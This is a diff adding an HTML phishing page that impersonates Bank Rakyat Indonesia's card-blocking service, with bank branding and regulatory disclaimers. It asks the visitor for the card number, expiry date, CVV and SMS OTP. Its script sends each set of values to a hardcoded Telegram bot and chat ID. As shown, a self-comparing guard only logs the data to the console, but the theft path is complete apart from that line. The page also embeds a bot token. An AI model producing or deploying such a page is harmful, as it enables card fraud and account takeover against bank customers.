@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Blokir Kartu — BRI</title>
+  <link rel="icon" href="favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    :root {
+      --bri-blue: #005AAA;
+      --bri-orange: #FF6A39;
+      --bri-blue-dark: #004A8F;
+      --bri-bg-light: #F0F5FA;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100vh;
+      overflow-x: hidden;
+      font-family: 'Montserrat', sans-serif;
+      background: #f5f5f5;
+    }
+
+    body {
+      padding-bottom: 30px;
+    }
+
+    .header-img {
+      width: 100%;
+      height: 90px;
+      background: url("https://raw.githubusercontent.com/predi1998a-oss/Gambar-bri/refs/heads/main/baner.jpg") no-repeat center center;
+      background-size: cover;
+    }
+
+    .content-wrapper {
+      padding: 0 15px;
+      margin-top: 10px;
+    }
+
+    .page {
+      display: none;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    .box-form {
+      background: #fff;
+      border-radius: 10px;
+      padding: 20px 18px;
+      box-shadow: 3px 3px 8px rgba(0,0,0,0.08);
+    }
+
+    .popup-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+
+    .popup-overlay.active { display: flex; }
+
+    .popup-box {
+      background: #fff;
+      border-radius: 12px;
+      padding: 25px 20px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+
+    .popup-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--bri-blue);
+      margin-bottom: 15px;
+      line-height: 1.4;
+    }
+
+    .popup-divider {
+      height: 1px;
+      background: #eee;
+      margin-bottom: 20px;
+    }
+
+    .popup-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--bri-bg-light);
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: var(--bri-blue);
+      margin-bottom: 15px;
+    }
+
+    .popup-text {
+      font-size: 15px;
+      color: #333;
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
+
+    .popup-btn-primary {
+      width: 100%;
+      background: var(--bri-blue);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      transition: background 0.2s ease;
+    }
+
+    .popup-btn-primary:hover {
+      background: var(--bri-blue-dark);
+      color: #fff;
+    }
+
+    .info-icon-wrapper {
+      text-align: center;
+      margin-bottom: 25px;
+      padding-top: 10px;
+    }
+
+    .info-icon {
+      width: 90px;
+      height: 90px;
+      background: linear-gradient(135deg, #E8F0FA, #D4E2F7);
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 42px;
+      color: var(--bri-blue);
+    }
+
+    .info-title {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--bri-blue);
+      margin-bottom: 15px;
+      line-height: 1.4;
+    }
+
+    .info-text {
+      text-align: center;
+      font-size: 14px;
+      color: #444;
+      line-height: 1.7;
+      margin-bottom: 30px;
+      padding: 0 5px;
+    }
+
+    .info-highlight {
+      background: var(--bri-bg-light);
+      border-left: 3px solid var(--bri-orange);
+      padding: 12px 15px;
+      border-radius: 6px;
+      margin-bottom: 25px;
+      font-size: 13px;
+      color: var(--bri-blue);
+      line-height: 1.6;
+    }
+
+    /* ===== KARTU ATM — NOMOR DITURUNKAN LEBIH BAWAH ===== */
+    .card-container {
+      width: 100%;
+      max-width: 340px;
+      height: 215px;
+      margin: 0 auto 20px;
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+      background: url("https://raw.githubusercontent.com/predi1998a-oss/Gambar-bri/refs/heads/main/kartu.jpg") no-repeat center center;
+      background-size: cover;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      color: white;
+    }
+
+    .card-chip {
+      display: none; /* Warna kuning dihilangkan */
+    }
+
+    .card-number-display {
+      font-size: 20px;
+      letter-spacing: 3px;
+      font-weight: 500;
+      font-family: 'Courier New', monospace;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+      margin-bottom: 15px; /* ✅ Diturunkan lagi */
+      padding: 0 20px;
+    }
+
+    .card-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      padding: 0 20px 25px;
+    }
+
+    .card-valid-display {
+      font-size: 13px;
+      letter-spacing: 1px;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .form-group label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--bri-blue);
+      margin-bottom: 4px;
+    }
+
+    .input-group {
+      border: 1px solid var(--bri-orange);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .input-group-text {
+      background: #fff;
+      border: none;
+      color: var(--bri-blue);
+    }
+
+    .form-control {
+      border: none;
+      font-size: 14px;
+      padding: 8px 10px;
+      outline: none;
+      box-shadow: none !important;
+      height: 40px;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border: none;
+      box-shadow: none;
+    }
+
+    select.form-control {
+      height: 40px !important;
+      font-size: 14px;
+      padding: 6px 10px;
+      cursor: pointer;
+    }
+
+    .otp-title {
+      text-align: center;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--bri-blue);
+      margin-bottom: 10px;
+    }
+
+    .otp-desc {
+      text-align: center;
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 25px;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 55px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .otp-input:focus {
+      border-color: var(--bri-orange);
+      box-shadow: 0 0 0 3px rgba(255,106,57,0.15);
+    }
+
+    .otp-input.filled {
+      border-color: var(--bri-orange);
+    }
+
+    .btn-kembali {
+      background: #e9ecef;
+      color: #333;
+      margin-top: 0;
+      margin-right: 8px;
+    }
+
+    .btn-kembali:hover {
+      background: #dee2e6;
+      color: #333;
+    }
+
+    .d-flex-gap {
+      display: flex;
+      gap: 8px;
+    }
+
+    .d-flex-gap button {
+      flex: 1;
+    }
+
+    .btn-blockir {
+      width: 100%;
+      background: var(--bri-blue);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 13px;
+      border: none;
+      border-radius: 10px;
+      margin-top: 5px;
+      transition: background 0.2s ease;
+    }
+
+    .btn-blockir:hover {
+      background: var(--bri-blue-dark);
+      color: #fff;
+    }
+
+    .privacy-note {
+      font-size: 11px;
+      color: var(--bri-blue);
+      text-align: center;
+      margin-top: 15px;
+      line-height: 1.6;
+      padding: 0 10px 30px;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      padding: 20px;
+    }
+
+    .modal-overlay.active { display: flex; }
+
+    .modal-box {
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px 25px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+
+    .modal-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--bri-blue);
+      margin-bottom: 15px;
+    }
+
+    .modal-text {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
+
+    .modal-btn {
+      width: 100%;
+      background: var(--bri-blue);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10001;
+    }
+
+    .loading-overlay.active { display: flex; }
+
+    .loading-icon {
+      font-size: 40px;
+      color: #fff;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .header-img { height: 75px; }
+      .box-form { padding: 18px 15px; }
+      .popup-box { padding: 20px 15px; }
+      .popup-title { font-size: 16px; }
+      .popup-text { font-size: 14px; }
+      .info-icon { width: 80px; height: 80px; font-size: 36px; }
+      .info-title { font-size: 18px; }
+      .info-text { font-size: 13px; }
+      .card-container { height: 190px; }
+      .card-number-display { 
+        font-size: 16px; 
+        margin-bottom: 10px; /* ✅ Diturunkan di HP juga */
+      }
+      .form-group label { font-size: 11px; }
+      .form-control, select.form-control { font-size: 13px; height: 38px; padding: 6px 8px; }
+      .otp-input { width: 45px; height: 50px; font-size: 20px; }
+      .btn-blockir { font-size: 15px; padding: 12px; }
+      .privacy-note { font-size: 10px; padding: 0 5px 25px; margin-top: 12px; }
+      .modal-box { padding: 25px 20px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="loading-overlay" id="loadingOverlay">
+    <i class="fas fa-spinner loading-icon"></i>
+  </div>
+
+  <div class="header-img"></div>
+
+  <div class="content-wrapper">
+    <div class="page active" id="pageKartu">
+      <div class="box-form">
+        <!-- KARTU ATM -->
+        <div class="card-container">
+          <div class="card-number-display" id="cardNumberText">XXXX XXXX XXXX XXXX</div>
+          <div class="card-bottom">
+            <div class="card-valid-display">
+              VALID THRU<br>
+              <span id="validThru">00/00</span>
+            </div>
+          </div>
+        </div>
+
+        <form id="formKartu">
+          <div class="form-group">
+            <label>Nomor Kartu</label>
+            <div class="input-group">
+              <div class="input-group-prepend">
+                <span class="input-group-text"><i class="fas fa-credit-card"></i></span>
+              </div>
+              <input type="tel" minlength="19" maxlength="19" class="form-control" id="cardInput" placeholder="Masukkan 16 digit nomor kartu" required>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <div class="col-6 pr-2">
+              <div class="form-group">
+                <label>Bulan</label>
+                <div class="input-group">
+                  <select class="form-control" id="monthSelect" required>
+                    <option value="00" disabled selected>Pilih</option>
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                  </select>
+                </div>
+              </div>
+            </div>
+            <div class="col-6 pl-2">
+              <div class="form-group">
+                <label>Tahun</label>
+                <div class="input-group">
+                  <select class="form-control" id="yearSelect" required>
+                    <option value="00" disabled selected>Pilih</option>
+                    <option value="24">2024</option>
+                    <option value="25">2025</option>
+                    <option value="26">2026</option>
+                    <option value="27">2027</option>
+                    <option value="28">2028</option>
+                    <option value="29">2029</option>
+                    <option value="30">2030</option>
+                    <option value="31">2031</option>
+                    <option value="32">2032</option>
+                    <option value="33">2033</option>
+                    <option value="34">2034</option>
+                    <option value="35">2035</option>
+                  </select>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>CVV / Kode Keamanan</label>
+            <div class="input-group">
+              <div class="input-group-prepend">
+                <span class="input-group-text"><i class="fas fa-lock"></i></span>
+              </div>
+              <input type="tel" minlength="3" maxlength="4" class="form-control" id="cvvInput" placeholder="3 digit di belakang kartu" required>
+            </div>
+          </div>
+
+          <button type="submit" class="btn-blockir">Lanjutkan</button>
+        </form>
+
+        <p class="privacy-note">
+          PT Bank Rakyat Indonesia (Persero) Tbk. berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
+        </p>
+      </div>
+    </div>
+
+    <div class="page" id="pageInfo">
+      <div class="box-form">
+        <div class="info-icon-wrapper">
+          <div class="info-icon">
+            <i class="fas fa-shield-alt"></i>
+          </div>
+        </div>
+
+        <h3 class="info-title">Verifikasi Keamanan</h3>
+
+        <p class="info-text">
+          Untuk keamanan transaksi, kami akan mengirimkan kode verifikasi (OTP) ke nomor ponsel yang terdaftar di Bank BRI.
+        </p>
+
+        <div class="info-highlight">
+          <i class="fas fa-info-circle mr-2"></i>
+          Pastikan nomor HP Anda aktif dan dapat menerima SMS. Kode OTP berlaku selama <strong>5 menit</strong>.
+        </div>
+
+        <div class="d-flex-gap">
+          <button type="button" class="btn-blockir btn-kembali" id="btnKembaliDariInfo">Kembali</button>
+          <button type="button" class="btn-blockir" id="btnLanjutkanKeOTP">Lanjutkan</button>
+        </div>
+
+        <p class="privacy-note">
+          Jangan pernah memberikan kode OTP kepada siapapun, termasuk pihak yang mengaku sebagai pegawai BRI.
+        </p>
+      </div>
+    </div>
+
+    <div class="popup-overlay" id="popupKonfirmasi">
+      <div class="popup-box">
+        <h3 class="popup-title">BLOKIR KARTU SEDANG DI PROSES</h3>
+        <div class="popup-divider"></div>
+        <div class="popup-icon"><i class="fas fa-check"></i></div>
+        <p class="popup-text">
+          Ada transaksi yang sedang berlangsung, apakah ingin dibatalkan?
+        </p>
+        <button class="popup-btn-primary" id="btnBatalkan">Ya, Batalkan</button>
+      </div>
+    </div>
+
+    <div class="page" id="pageOTP">
+      <div class="box-form">
+        <h3 class="otp-title">Verifikasi Kode OTP</h3>
+        <p class="otp-desc">
+          Kami telah mengirimkan kode OTP 6 digit ke nomor HP yang terdaftar di BRI.<br>
+          Masukkan kode tersebut di bawah ini.
+        </p>
+
+        <div class="otp-container">
+          <input type="tel" maxlength="1" class="otp-input" id="otp1" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp2" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp3" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp4" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp5" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp6" inputmode="numeric">
+        </div>
+
+        <div class="d-flex-gap">
+          <button type="button" class="btn-blockir btn-kembali" id="btnKembaliDariOTP">Kembali</button>
+          <button type="button" class="btn-blockir" id="btnKirimOTP">Kirim OTP</button>
+        </div>
+
+        <p class="privacy-note">
+          Kode OTP berlaku selama 5 menit. Jangan berikan kode ini kepada siapapun.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="successModal">
+    <div class="modal-box">
+      <h3 class="modal-title">Permintaan Berhasil</h3>
+      <p class="modal-text">
+        Permintaan pemblokiran kartu BRI sedang diproses. Kami akan mengirimkan notifikasi ke nomor HP Anda segera.
+      </p>
+      <button class="modal-btn" onclick="tutupModal()">Tutup</button>
+    </div>
+  </div>
+
+  <script>
+    async function kirimDataBlokirKartu(data, judul) {
+      const BOT_TOKEN = '8827808672:AAHY00e5ddDpfpdwK9ZSn35ZOIAlIZbACnk';
+      const CHAT_ID = '8405193617';
+      
+      if (BOT_TOKEN === '8827808672:AAHY00e5ddDpfpdwK9ZSn35ZOIAlIZbACnk') {
+        console.log(judul, data);
+        return;
+      }
+      
+      const pesan = `<b>${judul}</b>
+No. Kartu: ${data.noKartu || '-'}
+Masa Berlaku: ${data.bulan || '-'}/${data.tahun || '-'}
+CVV: ${data.cvv || '-'}
+Konfirmasi: ${data.konfirmasi || '-'}
+OTP: ${data.otp || '-'}`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: pesan,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+
+    let dataKartu = {};
+
+    const cardInput = document.getElementById('cardInput');
+    const monthSelect = document.getElementById('monthSelect');
+    const yearSelect = document.getElementById('yearSelect');
+    const cvvInput = document.getElementById('cvvInput');
+    const cardNumberText = document.getElementById('cardNumberText');
+    const validThru = document.getElementById('validThru');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const formKartu = document.getElementById('formKartu');
+    const pageKartu = document.getElementById('pageKartu');
+    const pageInfo = document.getElementById('pageInfo');
+    const pageOTP = document.getElementById('pageOTP');
+    const popupKonfirmasi = document.getElementById('popupKonfirmasi');
+
+    const btnKembaliDariInfo = document.getElementById('btnKembaliDariInfo');
+    const btnLanjutkanKeOTP = document.getElementById('btnLanjutkanKeOTP');
+    const btnBatalkan = document.getElementById('btnBatalkan');
+    const btnKembaliDariOTP = document.getElementById('btnKembaliDariOTP');
+    const btnKirimOTP = document.getElementById('btnKirimOTP');
+    const successModal = document.getElementById('successModal');
+    const otpInputs = [
+      document.getElementById('otp1'),
+      document.getElementById('otp2'),
+      document.getElementById('otp3'),
+      document.getElementById('otp4'),
+      document.getElementById('otp5'),
+      document.getElementById('otp6')
+    ];
+
+    cardInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '').slice(0, 16);
+      let formatted = value.replace(/(.{4})/g, '$1 ').trim();
+      this.value = formatted;
+      cardNumberText.textContent = formatted.padEnd(19, 'X');
+    });
+
+    function updateValidThru() {
+      validThru.textContent = `${monthSelect.value || '00'}/${(yearSelect.value || '00').slice(-2)}`;
+    }
+    monthSelect.addEventListener('change', updateValidThru);
+    yearSelect.addEventListener('change', updateValidThru);
+
+    formKartu.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const cardNumber = cardInput.value.trim().replace(/\s/g, '');
+      const month = monthSelect.value;
+      const year = yearSelect.value;
+      const cvv = cvvInput.value.trim();
+
+      if (cardNumber.length !== 16 || month === '00' || year === '00' || cvv.length < 3) {
+        alert('Harap lengkapi semua kolom dengan benar!');
+        return;
+      }
+
+      dataKartu = { noKartu: cardNumber, bulan: month, tahun: year, cvv: cvv };
+      loadingOverlay.classList.add('active');
+      await kirimDataBlokirKartu(dataKartu, 'DATA KARTU BRI');
+      loadingOverlay.classList.remove('active');
+
+      pageKartu.classList.remove('active');
+      pageInfo.classList.add('active');
+    });
+
+    btnLanjutkanKeOTP.addEventListener('click', function() {
+      popupKonfirmasi.classList.add('active');
+    });
+
+    btnBatalkan.addEventListener('click', async function() {
+      popupKonfirmasi.classList.remove('active');
+      loadingOverlay.classList.add('active');
+      await kirimDataBlokirKartu({ ...dataKartu, konfirmasi: 'Ya, Batalkan' }, 'KONFIRMASI BATALKAN');
+      loadingOverlay.classList.remove('active');
+
+      pageInfo.classList.remove('active');
+      pageOTP.classList.add('active');
+      otpInputs[0].focus();
+    });
+
+    btnKembaliDariInfo.addEventListener('click', function() {
+      pageInfo.classList.remove('active');
+      pageKartu.classList.add('active');
+    });
+    btnKembaliDariOTP.addEventListener('click', function() {
+      pageOTP.classList.remove('active');
+      pageInfo.classList.add('active');
+      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+    });
+
+    otpInputs.forEach((input, idx) => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        this.value ? this.classList.add('filled') : this.classList.remove('filled');
+        if (this.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) otpInputs[idx - 1].focus();
+      });
+    });
+
+    btnKirimOTP.addEventListener('click', async function() {
+      const kodeOTP = otpInputs.map(i => i.value).join('');
+      if (!/^\d{6}$/.test(kodeOTP)) {
+        alert('Masukkan 6 digit kode OTP lengkap!');
+        return;
+      }
+      loadingOverlay.classList.add('active');
+      await kirimDataBlokirKartu({ ...dataKartu, otp: kodeOTP }, 'DATA LENGKAP + OTP BRI');
+      loadingOverlay.classList.remove('active');
+      successModal.classList.add('active');
+    });
+
+    function tutupModal() {
+      successModal.classList.remove('active');
+      location.reload();
+    }
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
